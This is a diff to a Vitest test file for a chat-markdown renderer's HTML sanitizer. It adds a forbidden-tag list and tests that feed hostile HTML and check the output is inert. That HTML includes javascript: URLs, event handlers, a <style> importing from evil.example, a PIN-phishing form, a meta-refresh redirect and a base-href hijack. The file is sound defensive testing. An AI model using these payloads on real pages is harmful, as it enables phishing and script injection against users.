@@ -4,16 +4,26 @@
 // LessonReader and ResourcesTab call, and through the library SVG sanitizer the Resources tab uses.
 import { beforeAll, describe, expect, it } from "vitest";
 import { ensureChatKatex, renderChatMarkdown } from "./chat-markdown";
-import { sanitizeSvg } from "./sanitize-html";
+import { sanitizeHtml, sanitizeSvg } from "./sanitize-html";
 import flowchartSvg from "../../public/library/assets/arts-music-cs/flowchart-symbols.svg?raw";
 
-// Parse the output the way the webview will, then look for anything that could run script.
+// Script hosts, plus tags that are script-free but still unsafe inline: global CSS (<style>), forms that
+// post off the machine, and page-level <base>/<meta>/<link>.
+const FORBIDDEN = [
+  "script", "iframe", "object", "embed", "foreignobject",
+  "style", "form", "button", "textarea", "select", "base", "meta", "link",
+];
+
+// Parse the output the way the webview will, then look for anything that could run script, restyle
+// the app, or post a form.
 function dangers(html: string): string[] {
   const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
   const found: string[] = [];
   for (const el of Array.from(doc.body.querySelectorAll("*"))) {
     const tag = el.tagName.toLowerCase();
-    if (["script", "iframe", "object", "embed", "foreignobject"].includes(tag)) found.push(`<${tag}>`);
+    if (FORBIDDEN.includes(tag)) found.push(`<${tag}>`);
+    // GFM task lists are the one legitimate <input>: a disabled checkbox.
+    if (tag === "input" && !(el.getAttribute("type") === "checkbox" && el.hasAttribute("disabled"))) found.push("<input>");
     for (const attr of Array.from(el.attributes)) {
       if (/^on/i.test(attr.name)) found.push(`${tag}[${attr.name}]`);
       if (/^\s*javascript:/i.test(attr.value)) found.push(`${tag}[${attr.name}=${attr.value}]`);
@@ -56,6 +66,42 @@ describe("renderChatMarkdown: untrusted HTML comes out inert", () => {
     const html = renderChatMarkdown('<svg><a href="javascript:alert(1)"><circle onload="alert(2)" r="5"/></a></svg><math><mi xlink:href="javascript:alert(3)">x</mi></math>');
     expect(dangers(html)).toEqual([]);
   });
+
+  it("drops <style>, so a reply can't restyle the whole app", () => {
+    const html = renderChatMarkdown("hi <style>body{display:none}</style>");
+    expect(dangers(html)).toEqual([]);
+    expect(html).not.toContain("<style");
+    expect(html).toContain("hi");
+  });
+
+  it("drops a <style> that would @import or fetch from a remote host", () => {
+    // Straight to sanitizeHtml: through marked, the URLs get autolinked into <a> tags inside the
+    // <style>, which DOMPurify happens to drop anyway; this checks the sanitizer, not that accident.
+    const html = sanitizeHtml("ok <style>@import url(https://evil.example/a.css); body{background:url(https://evil.example/b)}</style>");
+    expect(dangers(html)).toEqual([]);
+    expect(html).not.toContain("evil.example");
+  });
+
+  it("drops a PIN-phishing <form> with its inputs and button", () => {
+    const html = renderChatMarkdown('<form action="https://evil.example"><input name=pin><button>Go</button></form>');
+    expect(dangers(html)).toEqual([]);
+    expect(html).not.toContain("<form");
+    expect(html).not.toContain("<input");
+    expect(html).not.toContain("<button");
+    expect(html).not.toContain("evil.example");
+  });
+
+  it("drops loose form controls and page-level tags", () => {
+    const html = renderChatMarkdown(
+      '<input type="text" value="PIN"> <input type="checkbox"> <button formaction="https://evil.example/f">b</button> ' +
+        "<textarea>t</textarea> <select><option>o</option></select> " +
+        '<base href="https://evil.example/"> <meta http-equiv="refresh" content="0;url=https://evil.example"> ' +
+        '<link rel="stylesheet" href="https://evil.example/s.css">',
+    );
+    expect(dangers(html)).toEqual([]);
+    expect(html).not.toContain("<input");
+    expect(html).not.toContain("evil.example");
+  });
 });
 
 describe("renderChatMarkdown: legitimate output survives sanitizing", () => {
@@ -87,8 +133,20 @@ describe("renderChatMarkdown: legitimate output survives sanitizing", () => {
     expect(html).toContain("<em>it</em>");
     expect(html).toContain("<code>code</code>");
     expect(html).toContain('<a href="https://example.com">docs</a>');
-    expect(html).toMatch(/<input[^>]*type="checkbox"/);
+    expect(dangers(html)).toEqual([]);
     expect(html).toContain('<code class="language-js">let a = 1 &lt; 2;');
+  });
+
+  it("keeps GFM task-list checkboxes (disabled, checked state intact)", () => {
+    const html = renderChatMarkdown("- [x] done\n- [ ] todo");
+    const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
+    const boxes = Array.from(doc.querySelectorAll("input"));
+    expect(boxes).toHaveLength(2);
+    for (const box of boxes) {
+      expect(box.getAttribute("type")).toBe("checkbox");
+      expect(box.hasAttribute("disabled")).toBe(true);
+    }
+    expect(boxes.map((b) => b.hasAttribute("checked"))).toEqual([true, false]);
   });
 });
 
